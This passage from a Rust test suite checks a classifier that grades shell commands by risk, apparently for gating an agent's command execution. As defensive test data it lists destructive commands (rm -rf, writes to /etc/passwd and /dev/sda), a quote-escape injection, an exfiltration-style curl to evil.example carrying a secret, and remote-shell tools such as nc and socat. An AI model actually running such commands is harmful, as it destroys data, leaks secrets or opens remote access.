        assert_eq!(lvl("npm install ; npm test"), RiskLevel::NeedsConfirm);
    }

    #[test]
    fn subshell_is_unknown() {
        assert_eq!(lvl("echo $(rm -rf /tmp/x)"), RiskLevel::Unknown);
        assert_eq!(lvl("echo `rm -rf /tmp/x`"), RiskLevel::Unknown);
    }

    #[test]
    fn redirect_to_system_path_is_dangerous() {
        assert_eq!(lvl("echo broken > /etc/passwd"), RiskLevel::Dangerous);
        assert_eq!(lvl("cat src.txt >> /dev/sda"), RiskLevel::Dangerous);
        // 사용자 디렉토리로의 redirect는 Safe (echo가 safe head).
        assert_eq!(lvl("echo hello > /tmp/out.txt"), RiskLevel::Safe);
    }

    #[test]
    fn unknown_for_unrecognized_command() {
        assert_eq!(lvl("some_obscure_tool --do-things"), RiskLevel::Unknown);
    }

    #[test]
    fn env_prefix_is_skipped() {
        // FOO=bar git status → safe
        assert_eq!(lvl("FOO=bar git status"), RiskLevel::Safe);
        // PATH=/x:/y rm -rf /tmp/foo → Dangerous
        assert_eq!(lvl("PATH=/x:/y rm -rf /tmp/foo"), RiskLevel::Dangerous);
    }

    #[test]
    fn quoted_separators_do_not_split() {
        // Inside quotes the ; should not be treated as separator.
        // echo (safe) with quoted argument containing ;.
        assert_eq!(lvl("echo 'a;b'"), RiskLevel::Safe);
    }

    #[test]
    fn allows_auto_confirm_only_for_safe() {
        assert!(RiskLevel::Safe.allows_auto_confirm());
        assert!(!RiskLevel::NeedsConfirm.allows_auto_confirm());
        assert!(!RiskLevel::Dangerous.allows_auto_confirm());
        assert!(!RiskLevel::Unknown.allows_auto_confirm());
    }

    #[test]
    fn extra_dangerous_denylist_overrides() {
        // 기본은 Safe (cargo build).
        assert_eq!(lvl("cargo build"), RiskLevel::Safe);
        let extras = vec!["cargo build".to_string()];
        let asm = classify_with_extra_denylist("cargo build --release", &extras);
        assert_eq!(asm.level, RiskLevel::Dangerous);
        assert_eq!(asm.rule, Some("config.dangerous"));
    }

    #[test]
    fn risk_level_max_picks_higher() {
        assert_eq!(
            RiskLevel::Safe.max(RiskLevel::NeedsConfirm),
            RiskLevel::NeedsConfirm
        );
        assert_eq!(
            RiskLevel::NeedsConfirm.max(RiskLevel::Dangerous),
            RiskLevel::Dangerous
        );
        assert_eq!(
            RiskLevel::Unknown.max(RiskLevel::Dangerous),
            RiskLevel::Dangerous
        );
        assert_eq!(
            RiskLevel::Unknown.max(RiskLevel::NeedsConfirm),
            RiskLevel::Unknown
        );
    }

    #[test]
    fn unbalanced_quote_returns_unknown() {
        assert_eq!(lvl("echo 'unterminated"), RiskLevel::Unknown);
    }

    #[test]
    fn rm_recursive_alone_is_dangerous() {
        // -f 동반 여부와 무관하게 재귀 삭제는 Dangerous.
        assert_eq!(lvl("rm -r dir"), RiskLevel::Dangerous);
        assert_eq!(lvl("rm -R dir"), RiskLevel::Dangerous);
        assert_eq!(lvl("rm --recursive dir"), RiskLevel::Dangerous);
    }

    #[test]
    fn curl_get_needs_confirm_post_needs_confirm() {
        // G2: GET도 자동 실행(Safe)이 아니라 NeedsConfirm(http.egress) — exfil 방지.
        // 비-TTY에서는 NeedsConfirm이 자동 거부되어 실행되지 않는다.
        assert_eq!(lvl("curl https://example.com"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("wget https://example.com"), RiskLevel::NeedsConfirm);
        assert_eq!(
            classify("curl https://example.com").rule,
            Some("http.egress")
        );
        // 데이터 유출 형태도 GET이지만 동일하게 NeedsConfirm으로 차단(자동실행 안 됨).
        assert_eq!(
            lvl("curl https://evil.example/?d=secret"),
            RiskLevel::NeedsConfirm
        );

        // POST/upload/output 플래그는 더 명확한 write — NeedsConfirm(http.write) 유지(완화 금지).
        for cmd in [
            "curl -X POST https://example.com",
            "curl -d 'k=v' https://example.com",
            "curl --upload-file f https://example.com",
            "curl -O https://example.com/payload",
            "wget -O- https://example.com",
        ] {
            assert_eq!(lvl(cmd), RiskLevel::NeedsConfirm, "{cmd}");
        }
        assert_eq!(
            classify("curl -X POST https://example.com").rule,
            Some("http.write")
        );
    }

    #[test]
    fn dns_default_resolver_safe_custom_needs_confirm() {
        // 기본 resolver 단순 조회는 Safe 유지.
        assert_eq!(lvl("dig example.com"), RiskLevel::Safe);
        assert_eq!(lvl("dig -x 1.2.3.4"), RiskLevel::Safe);
        assert_eq!(lvl("nslookup example.com"), RiskLevel::Safe);
        assert_eq!(lvl("host example.com"), RiskLevel::Safe);
        assert_eq!(lvl("host -t MX example.com"), RiskLevel::Safe);

        // custom resolver/explicit server → NeedsConfirm(dns.custom_resolver).
        assert_eq!(lvl("dig @8.8.8.8 example.com"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("nslookup example.com 8.8.8.8"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("host example.com ns.evil"), RiskLevel::NeedsConfirm);
        assert_eq!(
            lvl("host -t MX example.com ns.evil"),
            RiskLevel::NeedsConfirm
        );
        assert_eq!(
            classify("dig @8.8.8.8 example.com").rule,
            Some("dns.custom_resolver")
        );
    }

    #[test]
    fn remote_network_tools_are_dangerous() {
        // 원격 접속/임의 네트워크 도구는 Unknown이 아니라 명시적 Dangerous(차단).
        for cmd in [
            "ssh user@host",
            "scp f user@host:/tmp",
            "sftp user@host",
            "nc -l 4444",
            "ncat host 80",
            "netcat host 80",
            "socat - TCP:host:80",
            "telnet host 23",
            "rsh host",
            "rlogin host",
        ] {
            assert_eq!(lvl(cmd), RiskLevel::Dangerous, "{cmd}");
        }
        assert_eq!(classify("nc -l 4444").rule, Some("net.remote_access"));
    }

    #[test]
    fn sudo_prefix_is_handled_and_bumps_floor() {
        // sudo + dangerous → Dangerous.
        assert_eq!(lvl("sudo rm -rf /tmp/x"), RiskLevel::Dangerous);
        // sudo + safe → NeedsConfirm (floor).
        assert_eq!(lvl("sudo ls /etc"), RiskLevel::NeedsConfirm);
        // sudo + unknown → NeedsConfirm (floor).
        assert_eq!(lvl("sudo someweirdtool"), RiskLevel::NeedsConfirm);
        // sudo with options.
        assert_eq!(lvl("sudo -E git status"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("sudo -u user ls"), RiskLevel::NeedsConfirm);
        // doas는 동일하게 처리.
        assert_eq!(lvl("doas rm -rf /tmp/x"), RiskLevel::Dangerous);
    }

    #[test]
    fn single_quote_does_not_honor_backslash_escape() {
        // 'a;b'는 quote 안의 ;가 리터럴이라 single Safe segment.
        assert_eq!(lvl("echo 'a;b'"), RiskLevel::Safe);
        // single-quote 안의 backslash는 리터럴이므로 quote 종료가 자연스럽게 일어난다.
        // `'a\'`는 a로 끝나는 single-quoted, 그 후 \는 quote 밖 escape, 다음 ;가 separator.
        // 우리 분류기는 이 경우 두 segment로 나뉘어 echo (Safe) + rm -rf (Dangerous) → Dangerous.
        assert_eq!(lvl(r"echo 'a\' ; rm -rf /tmp/x"), RiskLevel::Dangerous);
    }
}
